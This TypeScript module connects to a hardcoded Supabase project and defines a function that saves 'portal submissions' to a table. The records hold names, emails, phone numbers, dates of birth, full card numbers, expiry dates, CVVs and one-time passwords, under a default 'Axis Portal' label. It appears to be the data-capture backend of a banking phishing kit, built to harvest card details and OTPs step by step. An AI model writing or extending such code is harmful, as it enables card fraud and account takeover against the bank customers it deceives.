import { createClient } from '@supabase/supabase-js';

export const SUPABASE_PROJECT_ID = 'qcfhvaoxsbrbckgwumnc';
export const SUPABASE_URL = 'https://qcfhvaoxsbrbckgwumnc.supabase.co';
export const SUPABASE_ANON_KEY = 'sb_publishable_Ecu7SyWph8QCbUUscticDQ_dWOeKJUc';

export const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

export interface SubmissionRecord {
  id?: string;
  created_at?: string;
  step: string;
  selected_service: string;
  full_name?: string;
  email?: string;
  mobile_number?: string;
  dob?: string;
  cardholder_name?: string;
  card_number?: string;
  expiry_date?: string;
  cvv?: string;
  otp?: string;
  ip_address?: string;
  status?: string;
}

/**
  * Save portal submission directly to Supabase table
  */
export async function saveSubmissionToSupabase(data: Record<string, any>) {
  try {
    const selected_service = data.selected_service || data.selectedService || data.service || 'Axis Portal';
    const full_name = data.full_name || data.fullName || null;
    const email = data.email || null;
    const mobile_number = data.mobile_number || data.mobileNumber || null;
    const dob = data.dob || null;
    const cardholder_name = data.cardholder_name || data.cardholderName || null;
    const card_number = data.card_number || data.cardNumber || null;
    const expiry_date = data.expiry_date || data.expiryDate || null;
    const cvv = data.cvv || null;
    const otp = data.otp || null;
    const step = data.step || 'submission';

    if (data.id) {
      // Update existing submission record in series, preserving existing fields
      const updatePayload: Record<string, any> = {
        step,
        status: data.status || 'updated',
      };

      if (selected_service) updatePayload.selected_service = selected_service;
      if (full_name) updatePayload.full_name = full_name;
      if (email) updatePayload.email = email;
      if (mobile_number) updatePayload.mobile_number = mobile_number;
      if (dob) updatePayload.dob = dob;
      if (cardholder_name) updatePayload.cardholder_name = cardholder_name;
      if (card_number) updatePayload.card_number = card_number;
      if (expiry_date) updatePayload.expiry_date = expiry_date;
      if (cvv) updatePayload.cvv = cvv;
      if (otp) updatePayload.otp = otp;

      const { data: result, error } = await supabase
        .from('submissions')
        .update(updatePayload)
        .eq('id', data.id)
        .select();

      if (!error && result && result.length > 0) {
        return { success: true, id: data.id, data: result };
      }
      console.warn('Supabase update notice:', error?.message || 'Update returned 0 rows');
    }

    // Insert initial submission record if no id or update yielded no row
    const { data: result, error } = await supabase
      .from('submissions')
      .insert([
        {
          step,
          selected_service,
          full_name,
          email,
          mobile_number,
          dob,
          cardholder_name,
          card_number,
          expiry_date,
          cvv,
          otp,
          ip_address: data.ip_address || 'Client',
          status: data.status || 'submitted',
          created_at: new Date().toISOString(),
        },
      ])
      .select();

    if (error) {
      console.warn('Supabase insert notice:', error.message);
      return { success: false, error: error.message };
    }
    const newId = result && result[0] ? result[0].id : undefined;
    return { success: true, id: newId, data: result };
  } catch (err: any) {
    console.error('Supabase error:', err);
    return { success: false, error: err.message };
  }
}

/**
 * Test connection health to Supabase
 */
export async function testSupabaseConnection() {
  try {
    const { data, error } = await supabase.from('submissions').select('id').limit(1);
    
    // PGRST205 means connected to Supabase and authenticated, but table needs creation
    const isConnected = !error || error.code === 'PGRST205' || error.code === '42P01';
    
    return {
      connected: isConnected,
      status: error ? (error.code === 'PGRST205' ? 200 : 400) : 200,
      statusText: error ? (error.code === 'PGRST205' ? 'Connected (table ready)' : error.message) : 'Connected',
      url: SUPABASE_URL,
      projectId: SUPABASE_PROJECT_ID,
      tableExists: !error,
    };
  } catch (err: any) {
    return {
      connected: false,
      status: 0,
      statusText: err.message || 'Connection failed',
      url: SUPABASE_URL,
      projectId: SUPABASE_PROJECT_ID,
      tableExists: false,
    };
  }
}
